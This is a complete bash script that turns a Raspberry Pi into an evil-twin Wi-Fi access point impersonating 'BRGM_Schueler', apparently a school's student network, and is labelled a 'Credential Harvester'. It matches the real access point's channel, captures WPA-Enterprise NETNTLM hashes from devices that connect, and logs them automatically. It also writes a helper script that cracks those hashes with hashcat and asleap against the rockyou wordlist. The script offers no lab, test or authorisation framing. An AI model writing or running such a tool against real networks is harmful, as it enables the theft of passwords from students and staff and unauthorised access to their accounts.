#!/bin/bash

# ============================================================
# BRGM_Schueler Evil Twin — Raspberry Pi 4B+
# Single script. Full setup + crack. No external adapter.
# ============================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# --- Check root ---
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Run with sudo: sudo bash $0${NC}"
    exit 1
fi

HASH_FILE="/home/pi/captured_hashes.txt"

echo -e "${CYAN}"
echo "  ╔══════════════════════════════════════════╗"
echo "  ║     BRGM_Schueler Credential Harvester   ║"
echo "  ║     Raspberry Pi 4B+ (Built-in WiFi)     ║"
echo "  ╚══════════════════════════════════════════╝"
echo -e "${NC}"

# ============================================================
# INSTALL DEPENDENCIES
# ============================================================
echo -e "${YELLOW}[1/8] Installing packages...${NC}"
sudo apt update -qq
sudo apt install -y -qq hostapd-wpe asleap hashcat dnsmasq 2>/dev/null

# ============================================================
# GENERATE CERTIFICATES
# ============================================================
echo -e "${YELLOW}[2/8] Generating EAP certificates...${NC}"
cd /etc/hostapd-wpe/certs
sudo ./bootstrap 2>/dev/null
cd ~

# ============================================================
# WRITE HOSTAPD-WPE CONFIG
# ============================================================
echo -e "${YELLOW}[3/8] Writing hostapd-wpe config for BRGM_Schueler...${NC}"

sudo tee /etc/hostapd-wpe/hostapd-wpe.conf > /dev/null << 'EOF'
interface=wlan0
ssid=BRGM_Schueler
hw_mode=g
channel=6
auth_algs=3
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/eap_users
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh.pem
EOF

# ============================================================
# WRITE DNSMASQ CONFIG
# ============================================================
echo -e "${YELLOW}[4/8] Writing dnsmasq config...${NC}"

sudo tee /etc/dnsmasq.conf > /dev/null << 'EOF'
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
no-resolv
log-dhcp
EOF

# ============================================================
# STOP INTERFERING SERVICES
# ============================================================
echo -e "${YELLOW}[5/8] Stopping interfering services...${NC}"
sudo systemctl stop dhcpcd wpa_supplicant 2>/dev/null || true
sudo systemctl mask dhcpcd 2>/dev/null || true
sudo pkill dnsmasq 2>/dev/null || true

# ============================================================
# SCAN FOR REAL AP CHANNEL
# ============================================================
echo -e "${YELLOW}[6/8] Scanning for real BRGM_Schueler AP...${NC}"
sudo ip link set wlan0 down
sleep 1
sudo ip link set wlan0 up
sleep 2

CHANNEL=$(sudo iwlist wlan0 scan 2>/dev/null | grep -A20 "BRGM_Schueler" | grep "Channel:" | awk '{print $2}' | head -1)

if [ -n "$CHANNEL" ]; then
    echo -e "${GREEN}[+] Real AP found on channel $CHANNEL. Matching it.${NC}"
    sudo sed -i "s/^channel=.*/channel=$CHANNEL/" /etc/hostapd-wpe/hostapd-wpe.conf
else
    echo -e "${YELLOW}[!] Real AP not found during scan. Sticking with channel 6.${NC}"
    echo -e "${YELLOW}[!] It will still work — clients just may take longer to connect.${NC}"
fi

# ============================================================
# SET STATIC IP
# ============================================================
echo -e "${YELLOW}[7/8] Setting static IP on wlan0...${NC}"
sudo ip addr flush dev wlan0 2>/dev/null || true
sudo ip addr add 192.168.10.1/24 dev wlan0
sudo ip link set wlan0 up

# ============================================================
# START DNSMASQ
# ============================================================
echo -e "${YELLOW}[8/8] Starting dnsmasq (DHCP for clients)...${NC}"
sudo dnsmasq -C /etc/dnsmasq.conf --no-daemon &
sleep 1

# ============================================================
# PREPARE CRACK WRAPPER
# ============================================================
cat > /home/pi/crack.sh << 'CRACKEOF'
#!/bin/bash
# Run: bash crack.sh
# Cracks any captured NETNTLMv2 hashes

HASH_FILE="/home/pi/captured_hashes.txt"

if [ ! -f "$HASH_FILE" ] || [ ! -s "$HASH_FILE" ]; then
    echo "[!] No hashes found in $HASH_FILE"
    echo "[*] Extract them from /var/log/hostapd-wpe.log and save to $HASH_FILE"
    exit 1
fi

echo "[*] Cracking with hashcat (mode 5500 = NETNTLMv2)..."
hashcat -m 5500 --force "$HASH_FILE" /usr/share/wordlists/rockyou.txt --show 2>/dev/null

echo ""
echo "[*] Cracking with asleap..."
while IFS= read -r line; do
    CHALLENGE=$(echo "$line" | awk -F: '{print $2$3$4$5}')
    RESPONSE=$(echo "$line" | cut -d: -f6- | tr -d '\n')
    USERNAME=$(echo "$line" | cut -d: -f1)
    if [ -n "$CHALLENGE" ] && [ -n "$RESPONSE" ]; then
        echo "[*] Trying: $USERNAME"
        asleap -C "$CHALLENGE" -R "$RESPONSE" -W /usr/share/wordlists/rockyou.txt 2>/dev/null | grep "password" || echo "[-] Not cracked"
    fi
done < "$HASH_FILE"
CRACKEOF
chmod +x /home/pi/crack.sh

# ============================================================
# SUMMARY
# ============================================================
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                   READY TO HUNT                      ║${NC}"
echo -e "${GREEN}╠══════════════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║  SSID:  BRGM_Schueler                               ║${NC}"
echo -e "${GREEN}║  Int:   wlan0 (built-in WiFi)                       ║${NC}"
echo -e "${GREEN}║  Ch:    $(grep ^channel /etc/hostapd-wpe/hostapd-wpe.conf | cut -d= -f2)                                              ║${NC}"
echo -e "${GREEN}╠══════════════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║  Logs:  sudo tail -f /var/log/hostapd-wpe.log       ║${NC}"
echo -e "${GREEN}║  Crack: bash /home/pi/crack.sh                      ║${NC}"
echo -e "${GREEN}║  Stop:  Ctrl+C                                      ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${NC}"
echo ""

# ============================================================
# LAUNCH HOSTAPD-WPE
# ============================================================
echo -e "${CYAN}[+] Starting fake AP. When hashes appear, copy the lines that look like:${NC}"
echo -e "${CYAN}    username:::challenge:response${NC}"
echo -e "${CYAN}    Save them to /home/pi/captured_hashes.txt, then run: bash /home/pi/crack.sh${NC}"
echo ""

# Run hostapd-wpe and capture NETNTLM output to the hash file
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf 2>&1 | tee -a /var/log/hostapd-wpe.log | while IFS= read -r line; do
    echo "$line"
    # Automatically save john NETNTLM lines to hash file
    if echo "$line" | grep -q "john NETNTLM"; then
        HASH=$(echo "$line" | grep -oP 'john NETNTLM:\s*\K.*')
        if [ -n "$HASH" ]; then
            echo "$HASH" >> "$HASH_FILE"
            echo -e "${GREEN}[+] HASH SAVED: $HASH${NC}"
        fi
    fi
done
